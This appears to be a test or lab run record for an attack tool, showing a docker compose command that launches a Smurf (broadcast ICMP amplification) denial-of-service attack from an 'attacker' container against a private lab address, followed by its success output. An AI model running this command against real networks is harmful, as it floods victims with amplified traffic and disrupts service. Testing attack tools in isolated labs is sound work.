name: smurf-attack
command: docker compose exec attacker mag smurf-attack --victim-ip 172.20.0.2 --broadcast-ip 172.20.0.255 --count 10
stdout:
Initialized Smurf attack: victim=172.20.0.2, broadcast=172.20.0.255
Starting Smurf attack: sending 10 packets
Progress: 1/10 ... 10/10 packets
Smurf attack completed
Sent 10 packets in 20.75s
[RESULT TABLE: SUCCESS, Packets Sent: 10, Duration: 20.7539s]
warnings: MAC address to reach destination not found. Using broadcast. (repeated per packet - scapy layer-2 resolution warning, non-fatal)
